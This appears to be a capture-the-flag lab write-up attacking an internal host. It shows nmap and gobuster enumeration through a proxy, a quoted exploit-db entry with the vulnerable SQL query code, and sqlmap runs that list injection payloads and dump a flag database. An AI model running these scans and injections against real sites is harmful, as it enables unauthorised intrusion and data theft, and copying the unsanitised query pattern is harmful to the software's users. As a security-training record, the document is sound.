# Reconnaissances 
## 172.16.1.12
```
$ proxychains nmap -sT -sV -Pn -T5 172.16.1.12
```
```bash
Nmap scan report for 172.16.1.12
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
3306/tcp open  mysql?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.94SVN%I=7%D=3/3%Time=65E41DBE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,33,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.16\.1\.
SF:12\]\r\n")%r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x
SF:20\[::ffff:172\.16\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20bei
SF:ng\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x2
SF:0more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.94SVN%I=7%D=3/3%Time=65E41DB8%P=x86_64-pc-linux-gnu%r(
SF:NULL,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLi
SF:nes,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4B,"G\0\
SF:0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusReques
SF:tTCP,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4B,"
SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4B,"
SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCook
SF:ie,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionR
SF:eq,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4B,"G
SF:\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B,"G\0\0\
SF:x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.32 seconds
```

### Observe the HTTP
```
$ proxychains firefox 172.16.1.12
$ gobuster dir --proxy socks5://127.0.0.1:1080 --url http://172.16.1.12/ -w /usr/share/wordlists/dirb/common.txt
```
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 1019]
/.htaccess            (Status: 403) [Size: 1019]
/.htpasswd            (Status: 403) [Size: 1019]
/blog                 (Status: 301) [Size: 232] [--> http://172.16.1.12/blog/]
/cgi-bin/             (Status: 403) [Size: 1033]
/dashboard            (Status: 301) [Size: 237] [--> http://172.16.1.12/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 231] [--> http://172.16.1.12/img/]
/index.php            (Status: 302) [Size: 0] [--> http://172.16.1.12/dashboard/]
/phpmyadmin           (Status: 403) [Size: 1188]
/webalizer            (Status: 301) [Size: 237] [--> http://172.16.1.12/webalizer/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
```
$ proxychains firefox 172.16.1.12/blog/
```
```
Responsive Blog|Blogging For Passion
```

Search exploit for Blog
```
$ searchsploit "Responsive Blog"
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Responsive Online Blog 1.0 - 'id' SQL Injection                                                                                           | php/webapps/48615.txt
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
```bash
$ cat /usr/share/exploitdb/exploits/php/webapps/48615.txt           
# Exploit Title: Responsive Online Blog 1.0 - 'id' SQL Injection
# Date: 2020-06-23
# Exploit Author: Eren Şimşek
# Vendor Homepage: https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14194&title=Responsive+Online+Blog+Website+using+PHP%2FMySQL
# Version: v1.0
# Tested on: Linux - Wamp Server

>Vulnerable File
   /category.php

>Vulnerable Code

   $id=$_REQUEST['id'];
   $query="SELECT * from blog_categories where id='".$id."'";
   Id parameter enters sql query without any changes

>Proof Of Concept
   sqlmap 'http://localhost/resblog/category.php?id=1' --dbs --batch
   OR
   http://TARGET/resblog/category.php?id=1' Single Quote will cause SQL error                                                                                                                                           
```

Try to exploit it using `sqlmap`
```
$ proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 --dbs --batch
```
```bash
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 3676=3676 AND 'Naqs'='Naqs

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' AND (SELECT 6230 FROM(SELECT COUNT(*),CONCAT(0x716a717a71,(SELECT (ELT(6230=6230,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Eaky'='Eaky

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 5050 FROM (SELECT(SLEEP(5)))TRYP) AND 'pzAk'='pzAk

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-1876' UNION ALL SELECT NULL,CONCAT(0x716a717a71,0x784d464e637475776d7759575a4f4e69456b50686659514f4b47506f745753667146595856755a6c,0x7170716b71)-- -
---
[02:03:28] [INFO] the back-end DBMS is MySQL
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
web application technology: PHP 7.4.7, Apache 2.4.43
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[02:03:28] [INFO] fetching database names
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:29] [INFO] retrieved: 'information_schema'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:29] [INFO] retrieved: 'test'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:29] [INFO] retrieved: 'performance_schema'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:29] [INFO] retrieved: 'flag'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:30] [INFO] retrieved: 'mysql'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:30] [INFO] retrieved: 'blog_admin_db'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:80  ...  OK
[02:03:30] [INFO] retrieved: 'phpmyadmin'
available databases [7]:                                                                                                                                                   
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[02:03:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/172.16.1.12'

[*] ending @ 02:03:30 /2024-03-03/
```

Dump database `flag`.
```
$ proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D flag --dump
```
```bash
Database: flag
Table: flag
[1 entry]
+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+

```
